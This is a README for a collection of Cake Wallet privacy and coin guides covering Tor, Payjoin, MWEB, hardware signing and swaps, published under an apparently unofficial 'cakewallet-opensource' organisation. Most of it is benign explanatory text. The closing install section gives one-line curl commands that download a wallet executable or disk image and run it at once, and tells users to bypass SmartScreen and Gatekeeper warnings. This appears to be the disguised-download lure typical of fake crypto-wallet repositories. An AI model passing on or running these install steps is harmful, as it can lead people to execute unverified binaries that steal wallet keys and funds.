![Cake Wallet Privacy and Coin Guides](assets/cake-wallet-guide-help-hub-banner.png)

# Cake Wallet Privacy and Coin Guides

Tor, Payjoin, Silent Payments, MWEB, Zcash, hardware signing, swaps and the Monero hub.

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/blob/main/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

> Privacy is a set of choices, not a switch. Each page here names what a feature hides, what it leaves visible and who can still see it.

## What this repository is for
This repository holds the coin-level and privacy-level work: the features that change what a transaction reveals, the devices that hold keys offline, and the paths that move value between coins, chains and cash. It covers Tor and what it does not hide, Payjoin and Silent Payments on Bitcoin, MWEB on Litecoin, shielded Zcash, hardware signing with Ledger, Trezor, BitBox, COLDCARD and Cupcake, and the air-gapped pattern those last two belong to. It also covers the money-moving flows: swaps, buys, sells, Cake Pay cards and the USDT bridge, each of which involves a provider with its own identity checks and its own failure modes. The pages separate three things that get mixed together in marketing: what the wallet does locally, what the chain publishes, and what a provider records about you. That separation is the point of the repository, and it is why the trust and KYC explainers sit next to the coin guides rather than in a separate section. The pages are deliberately conservative about what a feature guarantees. Where the documentation describes a capability but not its per-platform conditions, the page says that the condition is unverified instead of guessing, and where a feature belongs to a newer build than the desktop download published here, the page names the current app line rather than promising it for this file.

## Who it is for
- Monero users who want the full picture: accounts, subaddresses, nodes, rescan and Tor in one place.
- Bitcoin users interested in Payjoin, Silent Payments or running a hardware signer.
- People moving value between coins, chains or cash who need to know who sees what.
- Readers deciding between the multi-coin app and the Monero-only build from the same codebase.
- Anyone who wants to know what a provider records before using a buy, a sale or a card, rather than after.

## Start here
- [cake-wallet-monero](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-monero.md) - The XMR hub: create a wallet, sync it, use accounts, add privacy, buy or swap and check legality.
- [cake-wallet-tor-orbot](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) - Route the wallet through Tor, with the Android Orbot requirement and the limits of the protection.
- [cake-wallet-hardware-wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) - Connect Ledger, Trezor, BitBox, COLDCARD or Cupcake, with the per-platform limits that decide the setup.
- [cake-wallet-what-it-is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md) - The quick product answers: free, non-custodial, decentralised, traceable, hot or cold, based where.

## How to use these guides
1. Start with the Monero hub if XMR is the reason you are here; it links to every other Monero page.
2. Read the privacy feature page for the coin you actually hold, not the one with the longest page.
3. Before connecting a hardware device, check the platform limits; Linux supports none of them.
4. For anything involving a provider, read the identity section first so the checks are not a surprise later.
5. Treat every page as a description of the current app line, and install a current build before relying on a feature.
6. Keep the wallet's own settings notes next to the phrase, so a later change to a node or a server is reversible.

## The guides
### Privacy features
- [cake-wallet-tor-orbot](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) - Route the wallet through Tor, with the Android Orbot requirement and the limits of the protection.
- [cake-wallet-payjoin-bitcoin](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-payjoin-bitcoin.md) - Use Payjoin so a Bitcoin payment does not look like the usual one-input, two-output fingerprint.
- [cake-wallet-silent-payments](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md) - Understand Silent Payments, what the recipient gains and why address reuse stops mattering.
- [cake-wallet-litecoin-mweb](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-litecoin-mweb.md) - Use Litecoin MWEB extension blocks and know what a send reveals with and without them.
- [cake-wallet-zcash-shielded](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-zcash-shielded.md) - Send shielded Zcash and understand the practical difference between transparent and shielded addresses.

### Keys and signing
- [cake-wallet-hardware-wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) - Connect Ledger, Trezor, BitBox, COLDCARD or Cupcake, with the per-platform limits that decide the setup.
- [cake-wallet-bitcoin-cash-ledger](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-bitcoin-cash-ledger.md) - Sign Bitcoin Cash with a hardware device and avoid the address-format confusion that can cost coins.
- [cake-wallet-cupcake-pairing](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md) - Pair Cupcake with the mobile app so a spare phone signs while the online phone only watches.
- [cake-wallet-air-gapped-wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-air-gapped-wallet.md) - Understand offline signing, why the app itself is not air-gapped and where Cupcake fits the picture.
- [cake-wallet-safe-custody-keys](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md) - Judge the custody model on keys, backups and threats rather than on marketing language.

### Moving value
- [cake-wallet-swap-crypto](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) - Swap between coins in the app, choose quoted or fixed, and see who holds the funds mid-swap.
- [cake-wallet-buy-monero](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md) - Buy crypto through a provider, understand the identity step and know what the paper trail contains.
- [cake-wallet-sell-crypto](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-sell-crypto.md) - Sell through a provider, follow its deposit instructions exactly and triage a payout that is late.
- [cake-wallet-cake-pay-gift-card](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cake-pay-gift-card.md) - Buy gift and prepaid cards with crypto, and see what a card really costs beyond its face value.
- [cake-wallet-usdt-bridge](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md) - Bridge USDT between chains, add the destination token and check both sides before sending more.
- [cake-wallet-lightning](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-lightning.md) - Fund a Lightning balance inside the Bitcoin wallet, pay an invoice and keep on-chain Bitcoin as the base.

### Trust and the product
- [cake-wallet-what-it-is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md) - The quick product answers: free, non-custodial, decentralised, traceable, hot or cold, based where.
- [cake-wallet-kyc-anonymous](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md) - Separate the wallet from the provider and see exactly where identity checks apply and where they do not.
- [cake-wallet-supported-coins-networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) - See which coins and networks the wallet supports, including the ones it does not support.
- [cake-wallet-vs-monero-only](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-vs-monero-only.md) - Choose between the multi-coin app and the Monero-only build that ships from the same codebase.
- [cake-wallet-monero](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-monero.md) - The XMR hub: create a wallet, sync it, use accounts, add privacy, buy or swap and check legality.

## What each guide changes
| Task | Guide | Outcome |
| --- | --- | --- |
| Hide your IP from a node | [cake-wallet-tor-orbot](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) | Tor in the app, with the limits named |
| Make a Bitcoin payment less distinctive | [cake-wallet-payjoin-bitcoin](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-payjoin-bitcoin.md) | A Payjoin that does not broadcast the usual shape |
| Sign offline | [cake-wallet-air-gapped-wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-air-gapped-wallet.md) | Keys on a device that never touches a network |
| Connect a hardware wallet | [cake-wallet-hardware-wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) | An evidenced device on a platform that supports it |
| Move between coins | [cake-wallet-swap-crypto](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) | A quote, a provider and no fiat identity check |
| Understand Monero | [cake-wallet-monero](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-monero.md) | One page that leads to every XMR task |

## Common first questions
### Does Cake Wallet make me anonymous?
No wallet can. The app needs no account, but transparent chains publish your addresses and a provider you used may know who you are.

### Is Monero untraceable?
The chain hides sender, receiver and amount. Linking coins to a person still depends on how they were acquired and spent.

### Can I use a hardware wallet on Linux?
Not with this app: the documented per-platform limits include no hardware support on Linux. macOS supports Ledger over Bluetooth.

### Which is better, the multi-coin app or the Monero-only build?
Multi-coin if you hold anything besides XMR; the smaller build if Monero is all you want and you prefer fewer screens.

### Does using Tor slow the wallet down?
It can, and the first connection after enabling it is the slowest. The trade is a slower sync against a node that cannot see your address.

## Before you install
- Decide what you are protecting against: a remote observer, a provider, a thief or a coercer. Each has a different answer.
- Install a current build before relying on a privacy feature; the desktop release here predates several of them.
- Check the platform limits before buying a hardware device.
- Read the provider's identity requirements before you start a buy or a sale.
- Decide where the recovery phrase lives before you configure anything that holds value.

## About and license
Cake Wallet is an open-source, non-custodial multi-currency wallet by Cake Labs. The source in this repository is licensed MIT; read `LICENSE.md` for the exact terms. These pages describe the app as documented at the time of writing and make no promise about builds that are not published here.

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
No one-line command is published for Linux. The release ships a compressed archive, not an installer the shell can launch, so the download either needs extracting or needs the Flatpak build instead. Extract it with your file manager, or unpack it in a terminal with `tar -xf`, then run the executable inside the folder.

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> for the portable build, or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a> if your distribution prefers Flatpak.
2. For the archive, extract it and keep the whole folder together.
3. For the Flatpak file, install it with your software centre, or run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak`.
4. Run the app from the extracted folder or from your application menu.

<!-- INSTALL-END -->
